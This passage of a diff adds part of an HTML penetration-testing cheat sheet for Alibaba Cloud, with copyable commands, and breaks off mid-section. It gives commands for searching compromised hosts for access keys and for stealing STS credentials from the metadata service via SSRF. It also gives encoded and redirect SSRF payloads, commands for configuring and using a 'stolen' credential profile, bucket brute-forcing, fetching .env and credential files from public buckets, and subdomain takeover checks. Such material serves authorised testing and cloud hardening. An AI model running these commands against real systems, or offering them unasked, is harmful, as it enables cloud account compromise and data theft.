+        </div>
+        <div class="cmd-block">
+          <span class="cmd-label">Assume with inline policy (scope-down or test permissions)</span>
+          <pre class="cmd-text">aliyun sts AssumeRole \
+  --RoleArn acs:ram::&lt;ACCOUNT_ID&gt;:role/&lt;ROLE_NAME&gt; \
+  --RoleSessionName test \
+  --Policy '{"Version":"1","Statement":[{"Effect":"Allow","Action":"ecs:*","Resource":"*"}]}'</pre>
+          <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        </div>
+      </div>
+    </div>
+
+    <div class="card">
+      <div class="card-header" onclick="toggleCard(this)">
+        <span class="card-title">🔑 AccessKey Enumeration</span>
+        <span class="chevron">▼</span>
+      </div>
+      <div class="card-body">
+        <div class="cmd-block">
+          <span class="cmd-label">List access keys for a user</span>
+          <pre class="cmd-text">aliyun ram ListAccessKeys --UserName &lt;USERNAME&gt;</pre>
+          <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        </div>
+        <div class="cmd-block">
+          <span class="cmd-label">Common credential locations on compromised hosts</span>
+          <pre class="cmd-text"># CLI config (all profiles stored here)
+~/.aliyun/config.json
+cat ~/.aliyun/config.json
+
+# Environment variables
+env | grep -iE "aliyun|alibaba|alicloud|akid|secret"
+
+# Common code locations
+find / -name "*.json" -exec grep -l "AccessKeyId\|access_key_id" {} \; 2>/dev/null
+find / -name "*.env" -o -name ".env" 2>/dev/null | xargs grep -l "ALIYUN\|ALIBABA" 2>/dev/null
+
+# ECS user-data (may contain bootstrap scripts with keys)
+curl http://100.100.100.200/latest/user-data 2>/dev/null</pre>
+          <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        </div>
+        <p class="danger">Root account AccessKey IDs start with <strong>LTAI</strong>. Root-level AKs have unrestricted access to all resources in the account.</p>
+      </div>
+    </div>
+  </section>
+
+  <!-- ═══════════════════════════════════ IMDS / SSRF ══════════ -->
+  <section class="section" id="imds">
+    <div class="section-header">
+      <div class="section-icon" style="background:rgba(231,76,60,0.12)">⚡</div>
+      <span class="section-title">IMDS / Metadata Service & SSRF</span>
+      <span class="section-id">#04</span>
+    </div>
+
+    <div class="danger">
+      <strong>Alibaba Cloud Metadata endpoint:</strong> <code>http://100.100.100.200</code> (NOT 169.254.169.254 like AWS). Only reachable from within an ECS instance.
+    </div>
+
+    <div class="card">
+      <div class="card-header" onclick="toggleCard(this)">
+        <span class="card-title">💉 IMDS — Normal Mode (No Token Required) <span class="card-tag tag-red">SSRF TARGET</span></span>
+        <span class="chevron">▼</span>
+      </div>
+      <div class="card-body open">
+        <p class="desc">By default, ECS instances allow token-free metadata access. If an instance has a RAM role attached, STS credentials are exposed via SSRF with a single GET request.</p>
+        <div class="cmd-block">
+          <span class="cmd-label">Root metadata index</span>
+          <pre class="cmd-text">curl http://100.100.100.200/latest/meta-data/</pre>
+          <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        </div>
+        <div class="cmd-block">
+          <span class="cmd-label">Get instance ID and region</span>
+          <pre class="cmd-text">curl http://100.100.100.200/latest/meta-data/instance-id
+curl http://100.100.100.200/latest/meta-data/region-id
+curl http://100.100.100.200/latest/meta-data/zone-id</pre>
+          <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        </div>
+        <div class="cmd-block">
+          <span class="cmd-label">List attached RAM role name</span>
+          <pre class="cmd-text">curl http://100.100.100.200/latest/meta-data/ram/security-credentials/</pre>
+          <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        </div>
+        <div class="cmd-block">
+          <span class="cmd-label">Steal STS credentials (replace ROLE_NAME)</span>
+          <pre class="cmd-text">curl http://100.100.100.200/latest/meta-data/ram/security-credentials/&lt;ROLE_NAME&gt;
+
+# Returns: AccessKeyId, AccessKeySecret, SecurityToken, Expiration, LastUpdated</pre>
+          <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        </div>
+        <div class="cmd-block">
+          <span class="cmd-label">Extract all in one command</span>
+          <pre class="cmd-text">ROLE=$(curl -s http://100.100.100.200/latest/meta-data/ram/security-credentials/)
+curl -s http://100.100.100.200/latest/meta-data/ram/security-credentials/${ROLE}</pre>
+          <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        </div>
+        <div class="cmd-block">
+          <span class="cmd-label">Get user-data (often contains secrets/bootstrap scripts)</span>
+          <pre class="cmd-text">curl http://100.100.100.200/latest/user-data</pre>
+          <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        </div>
+        <div class="cmd-block">
+          <span class="cmd-label">Get network config (private/public IPs)</span>
+          <pre class="cmd-text">curl http://100.100.100.200/latest/meta-data/network/interfaces/macs/
+# Get interface MAC, then:
+curl http://100.100.100.200/latest/meta-data/network/interfaces/macs/&lt;MAC&gt;/vpc-id
+curl http://100.100.100.200/latest/meta-data/network/interfaces/macs/&lt;MAC&gt;/private-ipv4s
+curl http://100.100.100.200/latest/meta-data/network/interfaces/macs/&lt;MAC&gt;/public-ipv4s</pre>
+          <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        </div>
+      </div>
+    </div>
+
+    <div class="card">
+      <div class="card-header" onclick="toggleCard(this)">
+        <span class="card-title">🔒 IMDS — Security Hardening Mode (Token Required)</span>
+        <span class="chevron">▼</span>
+      </div>
+      <div class="card-body">
+        <p class="desc">When security hardening mode is enabled, a PUT request must be made first to obtain a token. SSRF via GET-only requests cannot bypass this — but redirects-based SSRF may still work.</p>
+        <div class="cmd-block">
+          <span class="cmd-label">Get IMDSv2-style token first</span>
+          <pre class="cmd-text">TOKEN=$(curl -s -X PUT \
+  "http://100.100.100.200/latest/api/token" \
+  -H "X-aliyun-ecs-metadata-token-ttl-seconds: 21600")
+echo $TOKEN</pre>
+          <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        </div>
+        <div class="cmd-block">
+          <span class="cmd-label">Use token in metadata requests</span>
+          <pre class="cmd-text">curl -H "X-aliyun-ecs-metadata-token: $TOKEN" \
+  http://100.100.100.200/latest/meta-data/ram/security-credentials/&lt;ROLE&gt;</pre>
+          <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        </div>
+        <div class="cmd-block">
+          <span class="cmd-label">Check if hardening mode is enforced (403 = enforced)</span>
+          <pre class="cmd-text">curl -v http://100.100.100.200/latest/meta-data/instance-id
+# 403 Forbidden → security hardening mode enabled
+# 200 OK         → normal (insecure) mode</pre>
+          <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        </div>
+        <p class="note">Even with hardening mode, SSRF via redirect chains may still retrieve the token PUT response if the SSRF follows redirects. Test SSRF that can issue PUT requests (e.g., via XHR with method override).</p>
+      </div>
+    </div>
+
+    <div class="card">
+      <div class="card-header" onclick="toggleCard(this)">
+        <span class="card-title">🎯 SSRF Testing Payloads</span>
+        <span class="chevron">▼</span>
+      </div>
+      <div class="card-body">
+        <p class="desc">When testing an application for SSRF, try these URLs to reach the metadata service:</p>
+        <div class="cmd-block">
+          <span class="cmd-label">Direct and encoded SSRF payloads</span>
+          <pre class="cmd-text">http://100.100.100.200/latest/meta-data/
+http://100.100.100.200/latest/meta-data/ram/security-credentials/
+
+# URL-encoded
+http%3A%2F%2F100.100.100.200%2Flatest%2Fmeta-data%2F
+
+# Alternative notations
+http://100.100.100.200
+http://0x64646464/latest/meta-data/         # hex of 100.100.100.100... adjust
+http://[::ffff:6464:6464]/latest/meta-data/ # IPv6 mapped
+
+# Via redirect (host you control)
+# Set up: curl -L http://your-server.com/redirect → 100.100.100.200/...</pre>
+          <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        </div>
+        <div class="cmd-block">
+          <span class="cmd-label">After credential theft — use stolen STS token</span>
+          <pre class="cmd-text"># Configure stolen credentials
+aliyun configure set --profile stolen --mode StsToken \
+  --region &lt;REGION&gt; \
+  --access-key-id &lt;STOLEN_AKID&gt; \
+  --access-key-secret &lt;STOLEN_AKSECRET&gt; \
+  --sts-token &lt;STOLEN_SECURITY_TOKEN&gt;
+
+# Verify
+aliyun --profile stolen sts GetCallerIdentity
+
+# Enumerate from stolen context
+aliyun --profile stolen ram ListUsers
+aliyun --profile stolen oss ls</pre>
+          <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ═══════════════════════════════════ ECS ══════════════════ -->
+  <section class="section" id="ecs">
+    <div class="section-header">
+      <div class="section-icon" style="background:rgba(46,204,113,0.12)">🖥</div>
+      <span class="section-title">ECS — Elastic Compute Service</span>
+      <span class="section-id">#05</span>
+    </div>
+
+    <div class="card">
+      <div class="card-header" onclick="toggleCard(this)">
+        <span class="card-title">📋 Instance Enumeration <span class="card-tag tag-green">ENUM</span></span>
+        <span class="chevron">▼</span>
+      </div>
+      <div class="card-body open">
+        <div class="cmd-block">
+          <span class="cmd-label">List all instances</span>
+          <pre class="cmd-text">aliyun ecs DescribeInstances --RegionId cn-hangzhou
+aliyun ecs DescribeInstances --RegionId cn-hangzhou --PageSize 100</pre>
+          <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        </div>
+        <div class="cmd-block">
+          <span class="cmd-label">Formatted output (concise)</span>
+          <pre class="cmd-text">aliyun ecs DescribeInstances \
+  --output cols=InstanceId,InstanceName,Status,PublicIpAddress,PrivateIpAddress \
+  rows=Instances.Instance[]</pre>
+          <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        </div>
+        <div class="cmd-block">
+          <span class="cmd-label">Get specific instance details</span>
+          <pre class="cmd-text">aliyun ecs DescribeInstances \
+  --InstanceIds '["i-xxxxxxxxxxxxxxxx"]'</pre>
+          <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        </div>
+        <div class="cmd-block">
+          <span class="cmd-label">Check attached RAM role on instance</span>
+          <pre class="cmd-text">aliyun ecs DescribeInstanceRamRole \
+  --InstanceIds '["i-xxxxxxxxxxxxxxxx"]'</pre>
+          <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        </div>
+        <div class="cmd-block">
+          <span class="cmd-label">Check instance metadata options (IMDS mode)</span>
+          <pre class="cmd-text">aliyun ecs DescribeInstances \
+  --InstanceIds '["i-xxxxxxxxxxxxxxxx"]' \
+  | grep -i metadata</pre>
+          <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        </div>
+        <div class="cmd-block">
+          <span class="cmd-label">Get user-data for instance (cloud-init scripts)</span>
+          <pre class="cmd-text">aliyun ecs DescribeUserData --InstanceId i-xxxxxxxxxxxxxxxx</pre>
+          <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        </div>
+      </div>
+    </div>
+
+    <div class="card">
+      <div class="card-header" onclick="toggleCard(this)">
+        <span class="card-title">🔒 Security Groups</span>
+        <span class="chevron">▼</span>
+      </div>
+      <div class="card-body">
+        <div class="cmd-block">
+          <span class="cmd-label">List all security groups</span>
+          <pre class="cmd-text">aliyun ecs DescribeSecurityGroups --RegionId cn-hangzhou</pre>
+          <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        </div>
+        <div class="cmd-block">
+          <span class="cmd-label">View rules for a security group</span>
+          <pre class="cmd-text">aliyun ecs DescribeSecurityGroupAttribute \
+  --SecurityGroupId sg-xxxxxxxxxxxxxxxxx \
+  --Direction ingress
+
+aliyun ecs DescribeSecurityGroupAttribute \
+  --SecurityGroupId sg-xxxxxxxxxxxxxxxxx \
+  --Direction egress</pre>
+          <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        </div>
+        <p class="danger">Look for rules with <code>SourceCidrIp: 0.0.0.0/0</code> on ports like 22 (SSH), 3389 (RDP), 8080, or any admin port. These are overly permissive.</p>
+        <div class="cmd-block">
+          <span class="cmd-label">List disk snapshots (data exposure)</span>
+          <pre class="cmd-text">aliyun ecs DescribeSnapshots --RegionId cn-hangzhou
+aliyun ecs DescribeSnapshots --InstanceId i-xxxx --RegionId cn-hangzhou</pre>
+          <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        </div>
+        <div class="cmd-block">
+          <span class="cmd-label">List custom images (may contain sensitive data)</span>
+          <pre class="cmd-text">aliyun ecs DescribeImages --ImageOwnerAlias self --RegionId cn-hangzhou</pre>
+          <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        </div>
+      </div>
+    </div>
+
+    <div class="card">
+      <div class="card-header" onclick="toggleCard(this)">
+        <span class="card-title">🔑 SSH Keys</span>
+        <span class="chevron">▼</span>
+      </div>
+      <div class="card-body">
+        <div class="cmd-block">
+          <span class="cmd-label">List all key pairs</span>
+          <pre class="cmd-text">aliyun ecs DescribeKeyPairs --RegionId cn-hangzhou
+aliyun ecs DescribeKeyPairs \
+  --output cols=KeyPairName,KeyPairFingerPrint,CreationTime \
+  rows=KeyPairs.KeyPair[]</pre>
+          <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        </div>
+        <p class="note">Note which key pairs are associated with instances. If you can create/import a key pair and attach it, that's a persistence and access vector.</p>
+      </div>
+    </div>
+  </section>
+
+  <!-- ═══════════════════════════════════ OSS ══════════════════ -->
+  <section class="section" id="oss">
+    <div class="section-header">
+      <div class="section-icon" style="background:rgba(243,156,18,0.12)">🪣</div>
+      <span class="section-title">OSS — Object Storage Service</span>
+      <span class="section-id">#06</span>
+    </div>
+
+    <div class="card">
+      <div class="card-header" onclick="toggleCard(this)">
+        <span class="card-title">🔎 Bucket Enumeration <span class="card-tag tag-yellow">HIGH IMPACT</span></span>
+        <span class="chevron">▼</span>
+      </div>
+      <div class="card-body open">
+        <div class="cmd-block">
+          <span class="cmd-label">List all buckets (aliyun CLI)</span>
+          <pre class="cmd-text">aliyun oss ls</pre>
+          <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        </div>
+        <div class="cmd-block">
+          <span class="cmd-label">List all buckets (ossutil)</span>
+          <pre class="cmd-text">ossutil ls
+ossutil ls -s  # short format</pre>
+          <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        </div>
+        <div class="cmd-block">
+          <span class="cmd-label">List objects in a bucket</span>
+          <pre class="cmd-text">ossutil ls oss://bucket-name
+ossutil ls oss://bucket-name -r   # recursive
+ossutil ls oss://bucket-name -r --include "*.env"  # filter by extension</pre>
+          <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        </div>
+        <div class="cmd-block">
+          <span class="cmd-label">Download files</span>
+          <pre class="cmd-text">ossutil cp oss://bucket-name/path/file.txt ./local-file.txt
+ossutil cp oss://bucket-name/ ./local-dir/ -r  # recursive download</pre>
+          <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        </div>
+      </div>
+    </div>
+
+    <div class="card">
+      <div class="card-header" onclick="toggleCard(this)">
+        <span class="card-title">⚙ Bucket Configuration & ACLs</span>
+        <span class="chevron">▼</span>
+      </div>
+      <div class="card-body open">
+        <div class="cmd-block">
+          <span class="cmd-label">Check bucket ACL (public access?)</span>
+          <pre class="cmd-text">ossutil stat oss://bucket-name   # shows ACL, region, creation date
+# ACL values: private | public-read | public-read-write</pre>
+          <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        </div>
+        <div class="cmd-block">
+          <span class="cmd-label">Check bucket policy</span>
+          <pre class="cmd-text">ossutil bucket-policy --method get oss://bucket-name</pre>
+          <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        </div>
+        <div class="cmd-block">
+          <span class="cmd-label">Check CORS configuration</span>
+          <pre class="cmd-text">ossutil cors --method get oss://bucket-name</pre>
+          <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        </div>
+        <div class="cmd-block">
+          <span class="cmd-label">Check if server-side encryption is enabled</span>
+          <pre class="cmd-text">ossutil bucket-encryption --method get oss://bucket-name</pre>
+          <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        </div>
+        <div class="cmd-block">
+          <span class="cmd-label">Check logging configuration</span>
+          <pre class="cmd-text">ossutil logging --method get oss://bucket-name</pre>
+          <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        </div>
+        <div class="cmd-block">
+          <span class="cmd-label">Check static website hosting (may expose sensitive data)</span>
+          <pre class="cmd-text">ossutil website --method get oss://bucket-name</pre>
+          <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        </div>
+        <p class="danger">Buckets with ACL <code>public-read</code> or <code>public-read-write</code> are world-accessible. Check for sensitive files: <code>.env</code>, <code>*.pem</code>, <code>*.key</code>, database dumps, backup files.</p>
+      </div>
+    </div>
+
+    <div class="card">
+      <div class="card-header" onclick="toggleCard(this)">
+        <span class="card-title">🌐 Public Bucket URL Patterns</span>
+        <span class="chevron">▼</span>
+      </div>
+      <div class="card-body">
+        <div class="cmd-block">
+          <span class="cmd-label">Bucket URL formats</span>
+          <pre class="cmd-text"># Standard public endpoint
+https://&lt;BUCKET&gt;.oss-&lt;REGION&gt;.aliyuncs.com
+
+# Example (Singapore)
+https://my-bucket.oss-ap-southeast-1.aliyuncs.com
+
+# Object URL
+https://&lt;BUCKET&gt;.oss-&lt;REGION&gt;.aliyuncs.com/&lt;OBJECT_KEY&gt;
+
+# Check if bucket is publicly accessible (no auth needed)
+curl -I https://my-bucket.oss-ap-southeast-1.aliyuncs.com
+# 200 or object listing = public-read
+# 403 = private</pre>
+          <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        </div>
+        <div class="cmd-block">
+          <span class="cmd-label">Unauthenticated bucket enumeration (public buckets)</span>
+          <pre class="cmd-text"># List contents of a public bucket (no auth)
+curl "https://&lt;BUCKET&gt;.oss-&lt;REGION&gt;.aliyuncs.com?max-keys=1000"
+
+# Returns XML listing of objects if public-read ACL is set</pre>
+          <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ═══════════════════════════════════ RDS ══════════════════ -->
+  <section class="section" id="rds">
+    <div class="section-header">
+      <div class="section-icon" style="background:rgba(52,152,219,0.12)">🗄</div>
+      <span class="section-title">RDS — ApsaraDB (Relational Database)</span>
+      <span class="section-id">#07</span>
+    </div>
+
+    <div class="card">
+      <div class="card-header" onclick="toggleCard(this)">
+        <span class="card-title">📋 RDS Instance Enumeration</span>
+        <span class="chevron">▼</span>
+      </div>
+      <div class="card-body open">
+        <div class="cmd-block">
+          <span class="cmd-label">List RDS instances</span>
+          <pre class="cmd-text">aliyun rds DescribeDBInstances --RegionId cn-hangzhou
+aliyun rds DescribeDBInstances --PageSize 50</pre>
+          <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        </div>
+        <div class="cmd-block">
+          <span class="cmd-label">Get instance details (connection endpoint, config)</span>
+          <pre class="cmd-text">aliyun rds DescribeDBInstanceAttribute \
+  --DBInstanceId rm-xxxxxxxxxxxxxxxx</pre>
+          <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        </div>
+        <div class="cmd-block">
+          <span class="cmd-label">Check whitelisted IPs (should NOT be 0.0.0.0/0)</span>
+          <pre class="cmd-text">aliyun rds DescribeDBInstanceIPArrayList \
+  --DBInstanceId rm-xxxxxxxxxxxxxxxx</pre>
+          <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        </div>
+        <div class="cmd-block">
+          <span class="cmd-label">List databases on an instance</span>
+          <pre class="cmd-text">aliyun rds DescribeDatabases \
+  --DBInstanceId rm-xxxxxxxxxxxxxxxx</pre>
+          <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        </div>
+        <div class="cmd-block">
+          <span class="cmd-label">List database accounts</span>
+          <pre class="cmd-text">aliyun rds DescribeAccounts \
+  --DBInstanceId rm-xxxxxxxxxxxxxxxx</pre>
+          <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        </div>
+        <div class="cmd-block">
+          <span class="cmd-label">Check SSL configuration</span>
+          <pre class="cmd-text">aliyun rds DescribeDBInstanceSSL \
+  --DBInstanceId rm-xxxxxxxxxxxxxxxx</pre>
+          <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        </div>
+        <div class="cmd-block">
+          <span class="cmd-label">Check TDE (Transparent Data Encryption)</span>
+          <pre class="cmd-text">aliyun rds DescribeDBInstanceTDE \
+  --DBInstanceId rm-xxxxxxxxxxxxxxxx</pre>
+          <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        </div>
+        <p class="danger">If <code>SecurityIPList</code> contains <code>0.0.0.0/0</code> and the instance has a public connection string (<code>ConnectionType: Public</code>), the DB is internet-accessible.</p>
+      </div>
+    </div>
+  </section>
+
+  <!-- ═══════════════════════════════════ NETWORKING ══════════ -->
+  <section class="section" id="network">
+    <div class="section-header">
+      <div class="section-icon" style="background:rgba(155,89,182,0.12)">🌐</div>
+      <span class="section-title">VPC & Networking</span>
+      <span class="section-id">#08</span>
+    </div>
+
+    <div class="card">
+      <div class="card-header" onclick="toggleCard(this)">
+        <span class="card-title">🗺 VPC Enumeration</span>
+        <span class="chevron">▼</span>
+      </div>
+      <div class="card-body open">
+        <div class="cmd-block">
+          <span class="cmd-label">List VPCs</span>
+          <pre class="cmd-text">aliyun vpc DescribeVpcs --RegionId cn-hangzhou</pre>
+          <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        </div>
+        <div class="cmd-block">
+          <span class="cmd-label">List vSwitches (subnets)</span>
+          <pre class="cmd-text">aliyun vpc DescribeVSwitches --RegionId cn-hangzhou
+aliyun vpc DescribeVSwitches --VpcId vpc-xxxxxxxx</pre>
+          <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        </div>
+        <div class="cmd-block">
+          <span class="cmd-label">List route tables</span>
+          <pre class="cmd-text">aliyun vpc DescribeRouteTables --RegionId cn-hangzhou --VpcId vpc-xxxxxxxx</pre>
+          <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        </div>
+        <div class="cmd-block">
+          <span class="cmd-label">List NAT Gateways (egress paths)</span>
+          <pre class="cmd-text">aliyun vpc DescribeNatGateways --RegionId cn-hangzhou</pre>
+          <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        </div>
+        <div class="cmd-block">
+          <span class="cmd-label">List EIPs (Elastic IPs — public-facing)</span>
+          <pre class="cmd-text">aliyun vpc DescribeEipAddresses --RegionId cn-hangzhou</pre>
+          <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        </div>
+        <div class="cmd-block">
+          <span class="cmd-label">VPC Peering connections</span>
+          <pre class="cmd-text">aliyun vpc DescribeVpcPeeringConnections</pre>
+          <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        </div>
+      </div>
+    </div>
+
+    <div class="card">
+      <div class="card-header" onclick="toggleCard(this)">
+        <span class="card-title">📡 SLB — Server Load Balancer</span>
+        <span class="chevron">▼</span>
+      </div>
+      <div class="card-body">
+        <div class="cmd-block">
+          <span class="cmd-label">List load balancers</span>
+          <pre class="cmd-text">aliyun slb DescribeLoadBalancers --RegionId cn-hangzhou</pre>
+          <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        </div>
+        <div class="cmd-block">
+          <span class="cmd-label">Get load balancer attributes (listeners, backends)</span>
+          <pre class="cmd-text">aliyun slb DescribeLoadBalancerAttribute \
+  --LoadBalancerId lb-xxxxxxxxxxxxxxxx</pre>
+          <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        </div>
+      </div>
+    </div>
+
+    <div class="card">
+      <div class="card-header" onclick="toggleCard(this)">
+        <span class="card-title">🔍 DNS &amp; Public Exposure Checks</span>
+        <span class="chevron">▼</span>
+      </div>
+      <div class="card-body">
+        <p class="desc">Alibaba Cloud DNS is managed by the <strong>dns</strong> service (formerly Alibaba Cloud DNS / Wanwang). Useful for identifying all publicly-exposed endpoints.</p>
+        <div class="cmd-block">
+          <span class="cmd-label">List DNS domains</span>
+          <pre class="cmd-text">aliyun dns DescribeDomains</pre>
+          <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        </div>
+        <div class="cmd-block">
+          <span class="cmd-label">List DNS records for a domain</span>
+          <pre class="cmd-text">aliyun dns DescribeDomainRecords --DomainName example.com</pre>
+          <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ═══════════════════════════════ UNAUTHENTICATED ENUM ═════ -->
+  <section class="section" id="unauth">
+    <div class="section-header">
+      <div class="section-icon" style="background:rgba(243,156,18,0.12)">👁</div>
+      <span class="section-title">Unauthenticated Enumeration</span>
+      <span class="section-id">#09</span>
+    </div>
+    <div class="info-box">No credentials needed for these techniques. Useful for external recon and pre-engagement scoping against an Alibaba Cloud-hosted target.</div>
+
+    <div class="card">
+      <div class="card-header" onclick="toggleCard(this)">
+        <span class="card-title">🪣 Public OSS Bucket Discovery <span class="card-tag tag-yellow">NO CREDS</span></span>
+        <span class="chevron">▼</span>
+      </div>
+      <div class="card-body open">
+        <p class="desc">OSS bucket names are globally unique. If you know or can guess a bucket name, you can test for public access with no credentials.</p>
+        <div class="cmd-block">
+          <span class="cmd-label">Test if a named bucket is public</span>
+          <pre class="cmd-text"># Format: https://&lt;BUCKET&gt;.oss-&lt;REGION&gt;.aliyuncs.com
+curl -s -o /dev/null -w "%{http_code}" \
+  https://target-bucket.oss-cn-hangzhou.aliyuncs.com
+# 200 = public read | 403 = private | 404 = does not exist</pre>
+          <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        </div>
+        <div class="cmd-block">
+          <span class="cmd-label">List public bucket contents (no auth)</span>
+          <pre class="cmd-text">curl "https://target-bucket.oss-cn-hangzhou.aliyuncs.com?max-keys=1000"
+# Returns XML listing if public-read ACL is set</pre>
+          <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        </div>
+        <div class="cmd-block">
+          <span class="cmd-label">Bucket name bruteforce / permutation wordlist</span>
+          <pre class="cmd-text"># Common naming patterns to try:
+# &lt;company&gt;-backup, &lt;company&gt;-data, &lt;company&gt;-assets
+# &lt;company&gt;-prod, &lt;company&gt;-dev, &lt;company&gt;-staging
+# &lt;company&gt;-logs, &lt;company&gt;-static, &lt;company&gt;-cdn
+
+for bucket in company-backup company-data company-prod company-dev company-logs; do
+  code=$(curl -s -o /dev/null -w "%{http_code}" \
+    https://${bucket}.oss-ap-southeast-1.aliyuncs.com)
+  echo "$bucket → $code"
+done</pre>
+          <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        </div>
+        <div class="cmd-block">
+          <span class="cmd-label">Regions to try for bucket enumeration</span>
+          <pre class="cmd-text">oss-cn-hangzhou.aliyuncs.com
+oss-cn-shanghai.aliyuncs.com
+oss-cn-beijing.aliyuncs.com
+oss-ap-southeast-1.aliyuncs.com   # Singapore (common for intl)
+oss-us-east-1.aliyuncs.com
+oss-eu-central-1.aliyuncs.com</pre>
+          <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        </div>
+        <div class="cmd-block">
+          <span class="cmd-label">Look for high-value files in public buckets</span>
+          <pre class="cmd-text"># Target file types via URL if you know object keys, or parse XML listing:
+curl "https://target.oss-cn-hangzhou.aliyuncs.com/.env"
+curl "https://target.oss-cn-hangzhou.aliyuncs.com/backup.sql"
+curl "https://target.oss-cn-hangzhou.aliyuncs.com/credentials.json"
+curl "https://target.oss-cn-hangzhou.aliyuncs.com/config/database.yml"</pre>
+          <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        </div>
+        <p class="danger">Public-read-write buckets allow anyone to upload files — check if target buckets accept PUT requests without auth.</p>
+      </div>
+    </div>
+
+    <div class="card">
+      <div class="card-header" onclick="toggleCard(this)">
+        <span class="card-title">🔍 DNS & Subdomain Enumeration</span>
+        <span class="chevron">▼</span>
+      </div>
+      <div class="card-body open">
+        <p class="desc">Identify exposed Alibaba Cloud assets by enumerating DNS records and subdomains. Look for CNAME records pointing to Alibaba Cloud endpoints.</p>
+        <div class="cmd-block">
+          <span class="cmd-label">Identify Alibaba Cloud hosting via DNS</span>
+          <pre class="cmd-text"># CNAMEs pointing to Alibaba services
+dig +short target.com CNAME
+# aliyuncs.com = Alibaba Cloud
+# alicdn.com = Alibaba CDN
+# aliyun.com = Alibaba services
+# oss-*.aliyuncs.com = OSS bucket
+# slb.aliyuncs.com = Server Load Balancer</pre>
+          <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        </div>
+        <div class="cmd-block">
+          <span class="cmd-label">Passive recon — find subdomains pointing to Alibaba</span>
+          <pre class="cmd-text"># Use tools like subfinder, amass, or certificate transparency logs:
+subfinder -d target.com -silent | while read sub; do
+  cname=$(dig +short $sub CNAME)
+  ip=$(dig +short $sub A)
+  [[ "$cname" == *"aliyun"* ]] && echo "ALICLOUD CNAME: $sub → $cname"
+  [[ "$ip" == *".*"* ]] && echo "IP: $sub → $ip"
+done
+
+# Check crt.sh for certificate transparency
+curl -s "https://crt.sh/?q=%.target.com&output=json" | jq '.[].name_value' | sort -u</pre>
+          <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        </div>
+        <div class="cmd-block">
+          <span class="cmd-label">Subdomain takeover check (Alibaba-specific)</span>
+          <pre class="cmd-text"># If a CNAME points to an unclaimed OSS/SLB endpoint, takeover may be possible
+# Fingerprints:
+# OSS: "NoSuchBucket" in response body
+# SLB: connection refused or 404 with no content
+
+curl -s https://subdomain.target.com | grep -i "NoSuchBucket\|not found"</pre>
+          <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        </div>
+      </div>
+    </div>
+
+    <div class="card">
+      <div class="card-header" onclick="toggleCard(this)">
+        <span class="card-title">🌐 Public IP / Port Scanning</span>
+        <span class="chevron">▼</span>
+      </div>
+      <div class="card-body">
+        <p class="desc">Identify ECS instances with public IPs and exposed services. Shodan and Censys index Alibaba Cloud IP ranges.</p>
+        <div class="cmd-block">
+          <span class="cmd-label">Alibaba Cloud IP ranges (for scoping)</span>
+          <pre class="cmd-text"># Alibaba Cloud publishes IP ranges at:
